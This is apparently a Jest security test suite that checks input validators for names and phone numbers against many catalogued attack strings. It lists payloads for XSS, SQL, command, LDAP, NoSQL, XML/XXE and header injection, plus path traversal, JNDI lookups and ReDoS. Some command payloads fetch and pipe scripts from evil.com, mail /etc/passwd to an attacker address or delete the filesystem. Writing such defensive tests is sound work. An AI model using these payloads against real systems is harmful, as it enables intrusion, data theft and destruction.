import { describe, test, expect } from '@jest/globals';
import { sanitizeString, validatePhone, validateName } from '../lib/validators.js';

describe('Security Tests - XSS Prevention', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '"><script>alert("XSS")</script>',
    '<script>document.location="http://evil.com"</script>',
    'javascript:alert("XSS")',
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<div style="background:url(javascript:alert(\'XSS\'))">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
    '<SCRIPT/XSS SRC="http://evil.com/xss.js"></SCRIPT>',
    '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',
    '<script>eval(String.fromCharCode(97,108,101,114,116))</script>',
    '<!--<script>alert("XSS")</script>-->',
    '<script>/*<!--*/alert("XSS")/*-->*/</script>',
    '${alert("XSS")}',
    '{{constructor.constructor("alert(1)")()}}',
  ];

  test('sanitizes all XSS payloads', () => {
    xssPayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('onload=');
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('<svg');
      expect(sanitized.toLowerCase()).not.toContain('script');
    });
  });

  test('prevents stored XSS in names', () => {
    xssPayloads.forEach(payload => {
      const result = validateName(payload);
      expect(result.valid).toBe(false);
    });
  });
});

describe('Security Tests - SQL Injection Prevention', () => {
  const sqlPayloads = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
    "1' AND 1=1--",
    "' UNION SELECT * FROM users--",
    "'; EXEC xp_cmdshell('dir'); --",
    "' OR 'a'='a",
    "1'; DELETE FROM users WHERE 'a'='a",
    "' OR ''='",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "'; WAITFOR DELAY '00:00:05'--",
    "1; SELECT SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
  ];

  test('sanitizes SQL injection attempts in names', () => {
    sqlPayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      // Should remove quotes and other SQL special chars
      expect(sanitized).not.toContain("'");
      expect(sanitized).not.toContain('"');
    });
  });

  test('validates against SQL in name field', () => {
    sqlPayloads.forEach(payload => {
      const result = validateName(payload);
      expect(result.valid).toBe(false);
    });
  });
});

describe('Security Tests - Command Injection Prevention', () => {
  const commandPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`cat /etc/passwd`',
    '$(cat /etc/passwd)',
    '; rm -rf /',
    '&& wget http://evil.com/malware.sh',
    '|| curl http://evil.com | sh',
    '\n/bin/sh\n',
    '; shutdown -h now',
    '| mail attacker@evil.com < /etc/passwd',
  ];

  test('prevents command injection in inputs', () => {
    commandPayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      // Basic sanitization should help, but main protection is not executing as shell commands
      expect(typeof sanitized).toBe('string');
      expect(sanitized.length).toBeLessThanOrEqual(200);
    });
  });
});

describe('Security Tests - Path Traversal Prevention', () => {
  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/var/www/../../etc/passwd',
    'C:\\..\\..\\windows\\system32\\',
    'file:///etc/passwd',
    '\\\\server\\share\\..\\..\\sensitive',
  ];

  test('prevents path traversal in address field', () => {
    pathPayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      // Should not be interpreted as file paths
      expect(typeof sanitized).toBe('string');
    });
  });
});

describe('Security Tests - LDAP Injection Prevention', () => {
  const ldapPayloads = [
    '*)(uid=*',
    '*)(|(uid=*',
    'admin)(|(password=*',
    'admin)(uid=*))(|(uid=*',
    '*)(objectClass=*',
    '*)(mail=*@*',
  ];

  test('prevents LDAP injection', () => {
    ldapPayloads.forEach(payload => {
      const result = validateName(payload);
      expect(result.valid).toBe(false);
    });
  });
});

describe('Security Tests - NoSQL Injection Prevention', () => {
  const noSqlPayloads = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "this.password == \'password\'"}',
    '[$ne]=1',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
  ];

  test('prevents NoSQL injection', () => {
    noSqlPayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('$gt');
      expect(sanitized).not.toContain('$ne');
      expect(sanitized).not.toContain('$where');
    });
  });
});

describe('Security Tests - XML Injection Prevention', () => {
  const xmlPayloads = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<![CDATA[<script>alert("XSS")</script>]]>',
    '<!--<script>alert("XSS")</script>-->',
    '<user><name>admin</name><role>admin</role></user>',
  ];

  test('prevents XML injection', () => {
    xmlPayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('<?xml');
      expect(sanitized).not.toContain('<!DOCTYPE');
      expect(sanitized).not.toContain('<!ENTITY');
      expect(sanitized).not.toContain('<![CDATA[');
    });
  });
});

describe('Security Tests - Header Injection Prevention', () => {
  const headerPayloads = [
    'test\r\nSet-Cookie: admin=true',
    'test\nLocation: http://evil.com',
    'test\r\n\r\n<script>alert("XSS")</script>',
    'test%0d%0aSet-Cookie:%20admin=true',
  ];

  test('prevents header injection', () => {
    headerPayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('\r');
      expect(sanitized).not.toContain('\n');
      expect(sanitized).not.toContain('%0d');
      expect(sanitized).not.toContain('%0a');
    });
  });
});

describe('Security Tests - Phone Number Edge Cases', () => {
  const maliciousPhones = [
    '555-1234; DROP TABLE users',
    '415-555-1234<script>alert("XSS")</script>',
    '../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    'tel:+1-415-555-1234;postd=1234',
    '415) 555-1234 OR 1=1',
  ];

  test('rejects malicious phone numbers', () => {
    maliciousPhones.forEach(payload => {
      const result = validatePhone(payload);
      if (result.valid) {
        // If valid, ensure it's properly sanitized
        expect(result.cleaned).toMatch(/^\d{3}-\d{3}-\d{4}$/);
      }
    });
  });
});

describe('Security Tests - Resource Exhaustion Prevention', () => {
  test('handles extremely long inputs', () => {
    const veryLongString = 'a'.repeat(1000000);
    const sanitized = sanitizeString(veryLongString);
    expect(sanitized.length).toBeLessThanOrEqual(200);
  });

  test('handles deeply nested objects', () => {
    let nested = { value: 'test' };
    for (let i = 0; i < 1000; i++) {
      nested = { nested };
    }
    // Should not crash or hang
    expect(sanitizeString(nested)).toBe('');
  });

  test('handles regex DOS attempts', () => {
    const regexDosPayloads = [
      'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
      '(a+)+$',
      '([a-zA-Z]+)*',
      '(a|a)*',
      '(.*a){x}',
    ];
    
    regexDosPayloads.forEach(payload => {
      const start = Date.now();
      sanitizeString(payload);
      const duration = Date.now() - start;
      expect(duration).toBeLessThan(100); // Should complete quickly
    });
  });
});

describe('Security Tests - Unicode and Encoding Attacks', () => {
  const unicodePayloads = [
    '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
    '\uFEFF\u003cscript\u003ealert("XSS")\u003c/script\u003e',
    '＜script＞alert("XSS")＜/script＞',
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
    String.fromCharCode(0x3c, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3e),
  ];

  test('handles unicode bypass attempts', () => {
    unicodePayloads.forEach(payload => {
      const sanitized = sanitizeString(payload);
      expect(sanitized.toLowerCase()).not.toContain('script');
    });
  });
});

describe('Security Tests - Business Logic Attacks', () => {
  test('prevents negative values in phone validation', () => {
    expect(validatePhone('-4155551234')).toEqual({ valid: false, cleaned: null });
    expect(validatePhone('-415-555-1234')).toEqual({ valid: false, cleaned: null });
  });

  test('prevents bypass using whitespace', () => {
    const result = validateName('   ');
    expect(result.valid).toBe(false);
  });

  test('prevents using control characters', () => {
    const controlChars = [
      String.fromCharCode(0),  // NULL
      String.fromCharCode(7),  // BELL
      String.fromCharCode(8),  // BACKSPACE
      String.fromCharCode(27), // ESCAPE
      String.fromCharCode(127), // DELETE
    ];
    
    controlChars.forEach(char => {
      const result = validateName(`John${char}Doe`);
      expect(result.valid).toBe(false);
    });
  });
});